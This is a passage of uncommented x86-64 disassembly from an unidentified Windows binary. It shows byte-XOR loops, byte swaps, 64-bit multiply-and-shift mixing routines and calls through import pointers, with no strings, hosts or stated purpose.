   140057e24:	jmp    0x140057e15
   140057e26:	mov    rcx,QWORD PTR [rbp+0x800]
   140057e2d:	xor    eax,eax
   140057e2f:	cmp    rbx,rax
   140057e32:	je     0x140057e60
   140057e34:	cmp    rcx,0x3f
   140057e38:	ja     0x140059d8e
   140057e3e:	mov    edx,eax
   140057e40:	and    edx,0x7
   140057e43:	mov    dl,BYTE PTR [rbp+rdx*1+0x710]
   140057e4a:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   140057e51:	inc    rax
   140057e54:	mov    BYTE PTR [rbp+rcx*1+0xcc0],dl
   140057e5b:	inc    rcx
   140057e5e:	jmp    0x140057e2f
   140057e60:	xor    eax,eax
   140057e62:	xor    ecx,ecx
   140057e64:	cmp    rcx,0x10
   140057e68:	je     0x140057e9a
   140057e6a:	mov    rdx,rcx
   140057e6d:	and    rdx,0xfffffffffffffff8
   140057e71:	add    rdx,rbp
   140057e74:	add    rdx,0x610
   140057e7b:	mov    r8d,eax
   140057e7e:	and    r8d,0x38
   140057e82:	shr    r8d,0x3
   140057e86:	mov    dl,BYTE PTR [r8+rdx*1]
   140057e8a:	xor    BYTE PTR [rbp+rcx*1+0xcc0],dl
   140057e91:	inc    rcx
   140057e94:	add    rax,0x8
   140057e98:	jmp    0x140057e64
   140057e9a:	movaps XMMWORD PTR [rbp+0x740],xmm7
   140057ea1:	movaps XMMWORD PTR [rbp+0x730],xmm7
   140057ea8:	movaps XMMWORD PTR [rbp+0x720],xmm7
   140057eaf:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140057eb6:	xor    eax,eax
   140057eb8:	cmp    rax,0x40
   140057ebc:	je     0x140057ed4
   140057ebe:	mov    ecx,DWORD PTR [rbp+rax*1+0xcc0]
   140057ec5:	bswap  ecx
   140057ec7:	mov    DWORD PTR [rbp+rax*1+0x710],ecx
   140057ece:	add    rax,0x4
   140057ed2:	jmp    0x140057eb8
   140057ed4:	movups xmm0,XMMWORD PTR [rbp+0x888]
   140057edb:	mov    eax,DWORD PTR [rbp+0x898]
   140057ee1:	movups XMMWORD PTR [rbp+0xd10],xmm0
   140057ee8:	mov    DWORD PTR [rbp+0xd20],eax
   140057eee:	and    DWORD PTR [rbp+0xd24],0x0
   140057ef5:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   140057efc:	movaps xmm1,XMMWORD PTR [rbp+0x720]
   140057f03:	movaps xmm2,XMMWORD PTR [rbp+0x730]
   140057f0a:	movaps xmm3,XMMWORD PTR [rbp+0x740]
   140057f11:	lea    rax,[rbp+0xd28]
   140057f18:	movups XMMWORD PTR [rax+0x30],xmm3
   140057f1c:	movups XMMWORD PTR [rax+0x20],xmm2
   140057f20:	movups XMMWORD PTR [rax+0x10],xmm1
   140057f24:	movups XMMWORD PTR [rax],xmm0
   140057f27:	call   0x140064214
   140057f2c:	mov    al,BYTE PTR [rip+0x40b5b]        # 0x140098a8d
   140057f32:	cmp    al,0x1
   140057f34:	je     0x140057f7d
   140057f36:	movzx  eax,al
   140057f39:	cmp    eax,0x2
   140057f3c:	je     0x140058023
   140057f42:	and    DWORD PTR [rbp+0x3d0],0x0
   140057f49:	lea    rcx,[rip+0xfffffffffffa9130]        # 0x140001080
   140057f50:	mov    rdx,QWORD PTR [rbp+0x1150]
   140057f57:	push   0x40
   140057f59:	pop    r8
   140057f5b:	lea    r9,[rbp+0x3d0]
   140057f62:	call   QWORD PTR [rip+0x3c8a0]        # 0x140094808
   140057f68:	test   eax,eax
   140057f6a:	sete   cl
   140057f6d:	inc    cl
   140057f6f:	mov    BYTE PTR [rip+0x40b18],cl        # 0x140098a8d
   140057f75:	test   eax,eax
   140057f77:	je     0x140058023
   140057f7d:	mov    al,BYTE PTR [rip+0x40c35]        # 0x140098bb8
   140057f83:	cmp    al,0x1
   140057f85:	je     0x140057faa
   140057f87:	movzx  eax,al
   140057f8a:	test   eax,eax
   140057f8c:	jne    0x140058023
   140057f92:	call   0x140065d51
   140057f97:	test   rax,rax
   140057f9a:	sete   cl
   140057f9d:	inc    cl
   140057f9f:	mov    BYTE PTR [rip+0x40c13],cl        # 0x140098bb8
   140057fa5:	test   rax,rax
   140057fa8:	je     0x140058023
   140057faa:	call   0x140064227
   140057faf:	mov    eax,0xc8c291de
   140057fb4:	xchg   DWORD PTR [rip+0x40b26],eax        # 0x140098ae0
   140057fba:	call   QWORD PTR [rip+0x3c690]        # 0x140094650
   140057fc0:	mov    eax,eax
   140057fc2:	mov    QWORD PTR [rip+0x40037],rax        # 0x140098000
   140057fc9:	lea    rcx,[rbp+0xd10]
   140057fd0:	push   0xffffffffffffffff
   140057fd2:	pop    rdx
   140057fd3:	call   0x140010840
   140057fd8:	xor    eax,eax
   140057fda:	xchg   DWORD PTR [rip+0x40b00],eax        # 0x140098ae0
   140057fe0:	mov    BYTE PTR [rip+0x40aa7],0x0        # 0x140098a8e
   140057fe7:	mov    eax,DWORD PTR [rbp+0xd10]
   140057fed:	add    DWORD PTR [rbp+0x888],eax
   140057ff3:	mov    eax,DWORD PTR [rbp+0xd14]
   140057ff9:	add    DWORD PTR [rbp+0x88c],eax
   140057fff:	mov    eax,DWORD PTR [rbp+0xd18]
   140058005:	add    DWORD PTR [rbp+0x890],eax
   14005800b:	mov    eax,DWORD PTR [rbp+0xd1c]
   140058011:	add    DWORD PTR [rbp+0x894],eax
   140058017:	mov    eax,DWORD PTR [rbp+0xd20]
   14005801d:	add    DWORD PTR [rbp+0x898],eax
   140058023:	mov    BYTE PTR [rip+0x40a62],0x0        # 0x140098a8c
   14005802a:	movaps XMMWORD PTR [rbp+0xcf0],xmm7
   140058031:	movaps XMMWORD PTR [rbp+0xce0],xmm7
   140058038:	movaps XMMWORD PTR [rbp+0xcd0],xmm7
   14005803f:	movaps XMMWORD PTR [rbp+0xcc0],xmm7
   140058046:	mov    rbx,QWORD PTR [rbp+0x848]
   14005804d:	mov    r8,QWORD PTR [rbp+0x798]
   140058054:	sub    r8,rbx
   140058057:	jbe    0x140058171
   14005805d:	mov    r9,QWORD PTR [rbp+0x850]
   140058064:	cmp    r9,0x4
   140058068:	ja     0x140059d9c
   14005806e:	mov    rcx,QWORD PTR [rbp+0x858]
   140058075:	cmp    rcx,0x5
   140058079:	jae    0x140059dae
   14005807f:	mov    eax,DWORD PTR [rbp+rcx*4+0x888]
   140058086:	mov    cl,BYTE PTR [rbp+0x860]
   14005808c:	rol    eax,cl
   14005808e:	xor    eax,DWORD PTR [rbp+r9*4+0x888]
   140058096:	xor    edx,edx
   140058098:	div    r8
   14005809b:	mov    r15,rdx
   14005809e:	mov    rax,QWORD PTR [rbp+0x4e8]
   1400580a5:	mov    QWORD PTR [rbp+0x710],rax
   1400580ac:	cmp    rbx,0x40
   1400580b0:	push   0x40
   1400580b2:	pop    rax
   1400580b3:	cmovae rbx,rax
   1400580b7:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   1400580be:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   1400580c5:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   1400580cc:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   1400580d3:	lea    rcx,[rbp+0xd10]
   1400580da:	mov    rdx,rbx
   1400580dd:	call   0x14003c0b8
   1400580e2:	mov    rcx,rax
   1400580e5:	mov    r8,rdx
   1400580e8:	lea    rax,[rdx+r15*1]
   1400580ec:	cmp    rax,QWORD PTR [rbp+0x798]
   1400580f3:	jbe    0x14005811d
   1400580f5:	xor    r9d,r9d
   1400580f8:	cmp    r8,r9
   1400580fb:	je     0x140058137
   1400580fd:	lea    rax,[r9+r15*1]
   140058101:	xor    edx,edx
   140058103:	div    QWORD PTR [rbp+0x798]
   14005810a:	mov    rax,QWORD PTR [rbp+0xd08]
   140058111:	mov    al,BYTE PTR [rax+rdx*1]
   140058114:	mov    BYTE PTR [rcx+r9*1],al
   140058118:	inc    r9
   14005811b:	jmp    0x1400580f8
   14005811d:	add    r15,QWORD PTR [rbp+0xd08]
   140058124:	xor    eax,eax
   140058126:	cmp    r8,rax
   140058129:	je     0x140058137
   14005812b:	mov    dl,BYTE PTR [r15+rax*1]
   14005812f:	mov    BYTE PTR [rcx+rax*1],dl
   140058132:	inc    rax
   140058135:	jmp    0x140058126
   140058137:	mov    rcx,QWORD PTR [rbp+0x840]
   14005813e:	xor    eax,eax
   140058140:	cmp    rbx,rax
   140058143:	je     0x140058171
   140058145:	cmp    rcx,0x3f
   140058149:	ja     0x140059d8e
   14005814f:	mov    edx,eax
   140058151:	and    edx,0x7
   140058154:	mov    dl,BYTE PTR [rbp+rdx*1+0x710]
   14005815b:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   140058162:	inc    rax
   140058165:	mov    BYTE PTR [rbp+rcx*1+0xcc0],dl
   14005816c:	inc    rcx
   14005816f:	jmp    0x140058140
   140058171:	xor    eax,eax
   140058173:	xor    ecx,ecx
   140058175:	cmp    rcx,0x10
   140058179:	je     0x1400581ab
   14005817b:	mov    rdx,rcx
   14005817e:	and    rdx,0xfffffffffffffff8
   140058182:	add    rdx,rbp
   140058185:	add    rdx,0x680
   14005818c:	mov    r8d,eax
   14005818f:	and    r8d,0x38
   140058193:	shr    r8d,0x3
   140058197:	mov    dl,BYTE PTR [r8+rdx*1]
   14005819b:	xor    BYTE PTR [rbp+rcx*1+0xcc0],dl
   1400581a2:	inc    rcx
   1400581a5:	add    rax,0x8
   1400581a9:	jmp    0x140058175
   1400581ab:	movaps XMMWORD PTR [rbp+0x740],xmm7
   1400581b2:	movaps XMMWORD PTR [rbp+0x730],xmm7
   1400581b9:	movaps XMMWORD PTR [rbp+0x720],xmm7
   1400581c0:	movaps XMMWORD PTR [rbp+0x710],xmm7
   1400581c7:	xor    eax,eax
   1400581c9:	cmp    rax,0x40
   1400581cd:	je     0x1400581e5
   1400581cf:	mov    ecx,DWORD PTR [rbp+rax*1+0xcc0]
   1400581d6:	bswap  ecx
   1400581d8:	mov    DWORD PTR [rbp+rax*1+0x710],ecx
   1400581df:	add    rax,0x4
   1400581e3:	jmp    0x1400581c9
   1400581e5:	movups xmm0,XMMWORD PTR [rbp+0x888]
   1400581ec:	mov    eax,DWORD PTR [rbp+0x898]
   1400581f2:	movups XMMWORD PTR [rbp+0xd10],xmm0
   1400581f9:	mov    DWORD PTR [rbp+0xd20],eax
   1400581ff:	and    DWORD PTR [rbp+0xd24],0x0
   140058206:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   14005820d:	movaps xmm1,XMMWORD PTR [rbp+0x720]
   140058214:	movaps xmm2,XMMWORD PTR [rbp+0x730]
   14005821b:	movaps xmm3,XMMWORD PTR [rbp+0x740]
   140058222:	lea    rax,[rbp+0xd28]
   140058229:	movups XMMWORD PTR [rax+0x30],xmm3
   14005822d:	movups XMMWORD PTR [rax+0x20],xmm2
   140058231:	movups XMMWORD PTR [rax+0x10],xmm1
   140058235:	movups XMMWORD PTR [rax],xmm0
   140058238:	call   0x140064214
   14005823d:	mov    al,BYTE PTR [rip+0x4084a]        # 0x140098a8d
   140058243:	cmp    al,0x1
   140058245:	je     0x14005828e
   140058247:	movzx  eax,al
   14005824a:	cmp    eax,0x2
   14005824d:	je     0x140058334
   140058253:	and    DWORD PTR [rbp+0x610],0x0
   14005825a:	lea    rcx,[rip+0xfffffffffffa8e1f]        # 0x140001080
   140058261:	mov    rdx,QWORD PTR [rbp+0x1150]
   140058268:	push   0x40
   14005826a:	pop    r8
   14005826c:	lea    r9,[rbp+0x610]
   140058273:	call   QWORD PTR [rip+0x3c58f]        # 0x140094808
   140058279:	test   eax,eax
   14005827b:	sete   cl
   14005827e:	inc    cl
   140058280:	mov    BYTE PTR [rip+0x40807],cl        # 0x140098a8d
   140058286:	test   eax,eax
   140058288:	je     0x140058334
   14005828e:	mov    al,BYTE PTR [rip+0x40924]        # 0x140098bb8
   140058294:	cmp    al,0x1
   140058296:	je     0x1400582bb
   140058298:	movzx  eax,al
   14005829b:	test   eax,eax
   14005829d:	jne    0x140058334
   1400582a3:	call   0x140065d51
   1400582a8:	test   rax,rax
   1400582ab:	sete   cl
   1400582ae:	inc    cl
   1400582b0:	mov    BYTE PTR [rip+0x40902],cl        # 0x140098bb8
   1400582b6:	test   rax,rax
   1400582b9:	je     0x140058334
   1400582bb:	call   0x140064227
   1400582c0:	mov    eax,0xc8c291de
   1400582c5:	xchg   DWORD PTR [rip+0x40815],eax        # 0x140098ae0
   1400582cb:	call   QWORD PTR [rip+0x3c37f]        # 0x140094650
   1400582d1:	mov    eax,eax
   1400582d3:	mov    QWORD PTR [rip+0x3fd26],rax        # 0x140098000
   1400582da:	lea    rcx,[rbp+0xd10]
   1400582e1:	push   0xffffffffffffffff
   1400582e3:	pop    rdx
   1400582e4:	call   0x14001dfc0
   1400582e9:	xor    eax,eax
   1400582eb:	xchg   DWORD PTR [rip+0x407ef],eax        # 0x140098ae0
   1400582f1:	mov    BYTE PTR [rip+0x40796],0x0        # 0x140098a8e
   1400582f8:	mov    eax,DWORD PTR [rbp+0xd10]
   1400582fe:	add    DWORD PTR [rbp+0x888],eax
   140058304:	mov    eax,DWORD PTR [rbp+0xd14]
   14005830a:	add    DWORD PTR [rbp+0x88c],eax
   140058310:	mov    eax,DWORD PTR [rbp+0xd18]
   140058316:	add    DWORD PTR [rbp+0x890],eax
   14005831c:	mov    eax,DWORD PTR [rbp+0xd1c]
   140058322:	add    DWORD PTR [rbp+0x894],eax
   140058328:	mov    eax,DWORD PTR [rbp+0xd20]
   14005832e:	add    DWORD PTR [rbp+0x898],eax
   140058334:	mov    BYTE PTR [rip+0x40751],0x0        # 0x140098a8c
   14005833b:	lea    rbx,[r13+0x10]
   14005833f:	lea    rcx,[rbp+0x7d8]
   140058346:	mov    eax,DWORD PTR [rcx+0xc0]
   14005834c:	mov    DWORD PTR [rbp+0xd20],eax
   140058352:	movups xmm0,XMMWORD PTR [rcx+0xb0]
   140058359:	movaps XMMWORD PTR [rbp+0xd10],xmm0
   140058360:	movups xmm0,XMMWORD PTR [rip+0x2fb19]        # 0x140087e80
   140058367:	movaps XMMWORD PTR [rbp+0xcc0],xmm0
   14005836e:	xor    eax,eax
   140058370:	xor    edx,edx
   140058372:	cmp    rdx,0x10
   140058376:	je     0x1400583fd
   14005837c:	mov    r10,QWORD PTR [rbp+rdx*1+0xcc0]
   140058384:	mov    r8,rax
   140058387:	xor    r9d,r9d
   14005838a:	movabs r14,0xb89294a129ad1091
   140058394:	movabs r15,0xf6e2e6bfab39e8f7
   14005839e:	cmp    r9,0x14
   1400583a2:	je     0x1400583e8
   1400583a4:	mov    r11d,DWORD PTR [rbp+r9*1+0xd10]
   1400583ac:	add    r9,0x4
   1400583b0:	mov    ecx,r8d
   1400583b3:	and    cl,0x20
   1400583b6:	shl    r11,cl
   1400583b9:	xor    r11,r10
   1400583bc:	mov    rcx,r11
   1400583bf:	shr    rcx,0x1d
   1400583c3:	xor    rcx,r11
   1400583c6:	imul   rcx,r14
   1400583ca:	mov    r11,rcx
   1400583cd:	shr    r11,0x23
   1400583d1:	xor    r11,rcx
   1400583d4:	imul   r11,r15
   1400583d8:	mov    r10,r11
   1400583db:	shr    r10,0x1a
   1400583df:	xor    r10,r11
   1400583e2:	add    r8,0x20
   1400583e6:	jmp    0x14005839e
   1400583e8:	mov    QWORD PTR [rbp+rdx*1+0xcc0],r10
   1400583f0:	add    rdx,0x8
   1400583f4:	add    rax,0x20
   1400583f8:	jmp    0x140058372
   1400583fd:	movaps xmm0,XMMWORD PTR [rbp+0xcc0]
   140058404:	movaps XMMWORD PTR [rbp+0x710],xmm0
   14005840b:	movabs rax,0x40714d53b9553253
   140058415:	mov    QWORD PTR [rbp+0x720],rax
   14005841c:	and    QWORD PTR [rbp+0x728],0x0
   140058424:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   14005842b:	push   0xffffffffffffffff
   14005842d:	pop    rdx
   14005842e:	xor    r8d,r8d
   140058431:	cmp    r8,0x10
   140058435:	je     0x1400584d1
   14005843b:	mov    r9,QWORD PTR [rbp+r8*1+0xd10]
   140058443:	xor    eax,eax
   140058445:	mov    r10,r8
   140058448:	mov    r11,rdx
   14005844b:	mov    r15,QWORD PTR [rbp+0x4d0]
   140058452:	mov    r12,QWORD PTR [rbp+0x1140]
   140058459:	cmp    rdi,r11
   14005845c:	mov    r14,r11
   14005845f:	cmovb  r14,rdi
   140058463:	cmp    rax,0x40
   140058467:	je     0x1400584bc
   140058469:	add    r14,r10
   14005846c:	mov    rcx,rsi
   14005846f:	shr    rcx,0x3c
   140058473:	neg    rcx
   140058476:	mov    ecx,0x0
   14005847b:	sbb    rcx,rcx
   14005847e:	or     rcx,r14
   140058481:	cmp    rcx,0x8
   140058485:	jae    0x140058492
   140058487:	shl    ecx,0x3
   14005848a:	mov    r14,r12
   14005848d:	shr    r14,cl
   140058490:	jmp    0x1400584a4
   140058492:	add    rcx,0xfffffffffffffff8
   140058496:	cmp    rcx,r12
   140058499:	jae    0x1400584a1
   14005849b:	mov    r14b,BYTE PTR [r15+rcx*1]
   14005849f:	jmp    0x1400584a4
   1400584a1:	xor    r14d,r14d
   1400584a4:	movzx  r14d,r14b
   1400584a8:	mov    ecx,eax
   1400584aa:	shl    r14,cl
   1400584ad:	or     r9,r14
   1400584b0:	dec    r11
   1400584b3:	inc    r10
   1400584b6:	add    rax,0x8
   1400584ba:	jmp    0x140058459
   1400584bc:	mov    QWORD PTR [rbp+r8*1+0xd10],r9
   1400584c4:	add    r8,0x8
   1400584c8:	add    rdx,0xfffffffffffffff8
   1400584cc:	jmp    0x140058431
   1400584d1:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   1400584d8:	movaps XMMWORD PTR [rbp+0x610],xmm0
   1400584df:	movaps XMMWORD PTR [rbp+0xcc0],xmm0
   1400584e6:	lea    rax,[rbp+0x7d8]
   1400584ed:	movups xmm0,XMMWORD PTR [rax+0xa0]
   1400584f4:	lea    rax,[rbp+0xd18]
   1400584fb:	movups XMMWORD PTR [rax+0x18],xmm0
   1400584ff:	movups XMMWORD PTR [rax+0x28],xmm7
   140058503:	lea    rax,[rbp+0xcc0]
   14005850a:	mov    QWORD PTR [rbp+0xd10],rax
   140058511:	lea    rax,[rbp+0xcd0]
   140058518:	mov    QWORD PTR [rbp+0xd18],rax
   14005851f:	and    QWORD PTR [rbp+0xd20],0x0
   140058527:	mov    QWORD PTR [rbp+0xd28],0x2
   140058532:	lea    rcx,[rbp+0xd10]
   140058539:	call   0x14003ad35
   14005853e:	test   rax,rax
   140058541:	je     0x140058548
   140058543:	xor    QWORD PTR [rax],rdx
   140058546:	jmp    0x140058532
   140058548:	movaps xmm0,XMMWORD PTR [rbp+0xcc0]
   14005854f:	movaps XMMWORD PTR [rbp+0xd10],xmm0
   140058556:	lea    rax,[rip+0x2f93b]        # 0x140087e98
   14005855d:	movabs rdx,0x40714d53b9553253
   140058567:	xor    r8d,r8d
   14005856a:	cmp    r8,0x10
   14005856e:	je     0x14005868d
   140058574:	mov    rcx,rdx
   140058577:	xor    r9d,r9d
   14005857a:	movabs r15,0xb89294a129ad1091
   140058584:	movabs r12,0xf6e2e6bfab39e8f7
   14005858e:	cmp    r9,0x10
   140058592:	je     0x140058604
   140058594:	mov    r10,QWORD PTR [rbp+r9*1+0x710]
   14005859c:	xor    r10,rcx
   14005859f:	mov    r11,r10
   1400585a2:	shr    r11,0x1d
   1400585a6:	xor    r11,r10
   1400585a9:	imul   r11,r15
   1400585ad:	mov    r10,r11
   1400585b0:	shr    r10,0x23
   1400585b4:	xor    r10,r11
   1400585b7:	imul   r10,r12
   1400585bb:	mov    r11,r10
   1400585be:	shr    r11,0x1a
   1400585c2:	xor    r11,r10
   1400585c5:	mov    r10,QWORD PTR [rbp+r9*1+0xd10]
   1400585cd:	lea    r14,[r10+r11*1]
   1400585d1:	xor    r11,r10
   1400585d4:	test   r9,r9
   1400585d7:	cmove  r11,r14
   1400585db:	mov    r10,r11
   1400585de:	imul   r10,r11
   1400585e2:	or     r10,0x5
   1400585e6:	add    r10,r11
   1400585e9:	mov    QWORD PTR [rbp+r9*1+0xd10],r10
   1400585f1:	add    r9,0x8
   1400585f5:	movabs r10,0x40714d53b9553253
   1400585ff:	add    rcx,r10
   140058602:	jmp    0x14005858e
   140058604:	xor    r9d,r9d
   140058607:	cmp    r9,0x2
   14005860b:	je     0x140058630
   14005860d:	mov    rcx,r9
   140058610:	xor    rcx,0x1
   140058614:	mov    r10,QWORD PTR [rbp+rcx*8+0xd10]
   14005861c:	mov    cl,BYTE PTR [rax+r9*4]
   140058620:	rol    r10,cl
   140058623:	xor    QWORD PTR [rbp+r9*8+0xd10],r10
   14005862b:	inc    r9
   14005862e:	jmp    0x140058607
   140058630:	inc    r8
   140058633:	mov    rcx,QWORD PTR [rbp+0xd10]
   14005863a:	mov    r9,QWORD PTR [rbp+0xd18]
   140058641:	mov    r10,rcx
   140058644:	shr    r10,0xa
   140058648:	xor    r10,rcx
   14005864b:	mov    rcx,r10
   14005864e:	shl    rcx,0x15
   140058652:	xor    rcx,r10
   140058655:	mov    r10,r9
   140058658:	shl    r10,0xe
   14005865c:	xor    r10,r9
   14005865f:	mov    r9,r10
   140058662:	shr    r9,0x21
   140058666:	xor    r9,r10
   140058669:	mov    QWORD PTR [rbp+0xd10],r9
   140058670:	mov    QWORD PTR [rbp+0xd18],rcx
   140058677:	movabs rcx,0x80e29aa772aa64a6
   140058681:	add    rdx,rcx
   140058684:	add    rax,0x8
   140058688:	jmp    0x14005856a
   14005868d:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   140058694:	movaps XMMWORD PTR [rbp+0x680],xmm0
   14005869b:	movaps xmm0,XMMWORD PTR [rbp+0x610]
   1400586a2:	lea    rax,[rbp+0x7d8]
   1400586a9:	movups XMMWORD PTR [rax+0x90],xmm0
   1400586b0:	movaps xmm0,XMMWORD PTR [rbp+0x680]
   1400586b7:	movups XMMWORD PTR [rax+0xa0],xmm0
   1400586be:	inc    rsi
   1400586c1:	mov    QWORD PTR [rbp+0x7e0],rsi
   1400586c8:	movaps xmm0,XMMWORD PTR [rbp+0x680]
   1400586cf:	movups XMMWORD PTR [r13+0x0],xmm0
   1400586d4:	add    rdi,0x10
   1400586d8:	mov    r13,rbx
   1400586db:	jmp    0x140057ce0
   1400586e0:	movups xmm0,XMMWORD PTR [rip+0x2f841]        # 0x140087f28
   1400586e7:	movaps XMMWORD PTR [rbp+0xd10],xmm0
   1400586ee:	xor    eax,eax
   1400586f0:	xor    edx,edx
   1400586f2:	cmp    rdx,0x10
   1400586f6:	je     0x14005877d
   1400586fc:	mov    r10,QWORD PTR [rbp+rdx*1+0xd10]
   140058704:	mov    r8,rax
   140058707:	xor    r9d,r9d
   14005870a:	cmp    r9,0x14
   14005870e:	je     0x140058768
   140058710:	mov    r11d,DWORD PTR [rbp+r9*1+0x640]
   140058718:	add    r9,0x4
   14005871c:	mov    ecx,r8d
   14005871f:	and    cl,0x20
   140058722:	shl    r11,cl
   140058725:	xor    r11,r10
   140058728:	mov    rcx,r11
   14005872b:	shr    rcx,0x1d
   14005872f:	xor    rcx,r11
   140058732:	movabs r10,0xb89294a129ad1091
   14005873c:	imul   rcx,r10
   140058740:	mov    r11,rcx
   140058743:	shr    r11,0x23
   140058747:	xor    r11,rcx
   14005874a:	movabs rcx,0xf6e2e6bfab39e8f7
   140058754:	imul   r11,rcx
   140058758:	mov    r10,r11
   14005875b:	shr    r10,0x1a
   14005875f:	xor    r10,r11
   140058762:	add    r8,0x20
   140058766:	jmp    0x14005870a
   140058768:	mov    QWORD PTR [rbp+rdx*1+0xd10],r10
   140058770:	add    rdx,0x8
   140058774:	add    rax,0x20
   140058778:	jmp    0x1400586f2
   14005877d:	movaps xmm0,XMMWORD PTR [rbp+0xd10]
   140058784:	movaps XMMWORD PTR [rbp+0x3d0],xmm0
   14005878b:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140058792:	movabs rax,0x33c3366c503e1720
   14005879c:	mov    r12,QWORD PTR [rbp+0xf68]
   1400587a3:	imul   r12,rax
   1400587a7:	movabs rax,0x7ddae3471243d999
   1400587b1:	add    r12,rax
   1400587b4:	mov    rsi,QWORD PTR [rbp+0x1160]
   1400587bb:	cmp    QWORD PTR [rbp+0x1148],rsi
   1400587c2:	je     0x1400589cd
   1400587c8:	movups xmm0,XMMWORD PTR [rsi-0x10]
   1400587cc:	add    rsi,0xfffffffffffffff0
   1400587d0:	movaps XMMWORD PTR [rbp+0x680],xmm0
   1400587d7:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   1400587de:	lea    rax,[rbp+0xd18]
   1400587e5:	movups XMMWORD PTR [rax+0x18],xmm0
   1400587e9:	movups XMMWORD PTR [rax+0x28],xmm7
   1400587ed:	lea    rax,[rbp+0x680]
   1400587f4:	mov    QWORD PTR [rbp+0xd10],rax
   1400587fb:	lea    rax,[rbp+0x690]
   140058802:	mov    QWORD PTR [rbp+0xd18],rax
   140058809:	and    QWORD PTR [rbp+0xd20],0x0
   140058811:	mov    QWORD PTR [rbp+0xd28],0x2
   14005881c:	lea    rcx,[rbp+0xd10]
   140058823:	call   0x14003ad35
   140058828:	test   rax,rax
   14005882b:	je     0x140058832
   14005882d:	xor    QWORD PTR [rax],rdx
   140058830:	jmp    0x14005881c
   140058832:	mov    rax,rsi
   140058835:	sub    rax,QWORD PTR [rbp+0x1148]
   14005883c:	movaps xmm0,XMMWORD PTR [rbp+0x680]
   140058843:	movaps XMMWORD PTR [rbp+0xcc0],xmm0
   14005884a:	movaps xmm0,XMMWORD PTR [rbp+0x3d0]
   140058851:	movaps XMMWORD PTR [rbp+0xd10],xmm0
   140058858:	movabs rcx,0xb19e19b36281f0b9
   140058862:	mov    QWORD PTR [rbp+0xd20],rcx
   140058869:	mov    QWORD PTR [rbp+0xd28],rax
   140058870:	lea    rax,[rip+0x2f6c9]        # 0x140087f40
   140058877:	mov    rdx,r12
   14005887a:	xor    r8d,r8d
   14005887d:	cmp    r8,0x10
   140058881:	je     0x1400589a0
   140058887:	mov    rcx,rdx
   14005888a:	xor    r9d,r9d
   14005888d:	movabs rbx,0xb19e19b36281f0b9
   140058897:	movabs r14,0xb89294a129ad1091
   1400588a1:	movabs r15,0xf6e2e6bfab39e8f7
   1400588ab:	cmp    r9,0x10
   1400588af:	je     0x140058917
   1400588b1:	mov    r10,QWORD PTR [rbp+r9*1+0xd10]
   1400588b9:	xor    r10,rcx
   1400588bc:	mov    r11,r10
   1400588bf:	shr    r11,0x1d
   1400588c3:	xor    r11,r10
   1400588c6:	imul   r11,r14
   1400588ca:	mov    r10,r11
   1400588cd:	shr    r10,0x23
   1400588d1:	xor    r10,r11
   1400588d4:	imul   r10,r15
   1400588d8:	mov    r11,r10
   1400588db:	shr    r11,0x1a
   1400588df:	xor    r11,r10
   1400588e2:	mov    r10,QWORD PTR [rbp+r9*1+0xcc0]
   1400588ea:	lea    rdi,[r10+r11*1]
   1400588ee:	xor    r11,r10
   1400588f1:	test   r9,r9
   1400588f4:	cmove  r11,rdi
   1400588f8:	mov    r10,r11
   1400588fb:	imul   r10,r11
   1400588ff:	or     r10,0x5
   140058903:	add    r10,r11
   140058906:	mov    QWORD PTR [rbp+r9*1+0xcc0],r10
   14005890e:	add    r9,0x8
   140058912:	add    rcx,rbx
   140058915:	jmp    0x1400588ab
   140058917:	xor    r9d,r9d
   14005891a:	cmp    r9,0x2
   14005891e:	je     0x140058943
   140058920:	mov    rcx,r9
   140058923:	xor    rcx,0x1
   140058927:	mov    r10,QWORD PTR [rbp+rcx*8+0xcc0]
   14005892f:	mov    cl,BYTE PTR [rax+r9*4]
   140058933:	rol    r10,cl
   140058936:	xor    QWORD PTR [rbp+r9*8+0xcc0],r10
   14005893e:	inc    r9
   140058941:	jmp    0x14005891a
   140058943:	inc    r8
   140058946:	mov    rcx,QWORD PTR [rbp+0xcc0]
   14005894d:	mov    r9,QWORD PTR [rbp+0xcc8]
   140058954:	mov    r10,rcx
   140058957:	shr    r10,0x1e
   14005895b:	xor    r10,rcx
   14005895e:	mov    rcx,r10
   140058961:	shl    rcx,0x1a
   140058965:	xor    rcx,r10
   140058968:	mov    r10,r9
   14005896b:	shl    r10,0x18
   14005896f:	xor    r10,r9
   140058972:	mov    r9,r10
   140058975:	shr    r9,0x1d
   140058979:	xor    r9,r10
   14005897c:	mov    QWORD PTR [rbp+0xcc0],r9
   140058983:	mov    QWORD PTR [rbp+0xcc8],rcx
   14005898a:	movabs rcx,0x633c3366c503e172
   140058994:	add    rdx,rcx
   140058997:	add    rax,0x8
   14005899b:	jmp    0x14005887d
   1400589a0:	movaps xmm0,XMMWORD PTR [rbp+0xcc0]
   1400589a7:	movaps XMMWORD PTR [rbp+0x610],xmm0
   1400589ae:	movups XMMWORD PTR [rsi],xmm0
   1400589b1:	movups xmm0,XMMWORD PTR [rsi]
   1400589b4:	movaps XMMWORD PTR [rbp+0x710],xmm0
   1400589bb:	movabs rax,0xcc3cc993afc1e8e0
   1400589c5:	add    r12,rax
   1400589c8:	jmp    0x1400587bb
   1400589cd:	mov    QWORD PTR [rbp+0x7d0],0x1
   1400589d8:	mov    rax,QWORD PTR [rbp+0x1148]
   1400589df:	mov    QWORD PTR [rbp+0x7d8],rax
   1400589e6:	mov    rax,QWORD PTR [rbp+0x1160]
   1400589ed:	mov    QWORD PTR [rbp+0x7e0],rax
   1400589f4:	and    QWORD PTR [rbp+0x7e8],0x0
   1400589fc:	and    QWORD PTR [rbp+0x7f8],0x0
   140058a04:	and    QWORD PTR [rbp+0x808],0x0
   140058a0c:	and    QWORD PTR [rbp+0x828],0x0
   140058a14:	lea    rcx,[rbp+0x808]
   140058a1b:	call   0x14003c06c
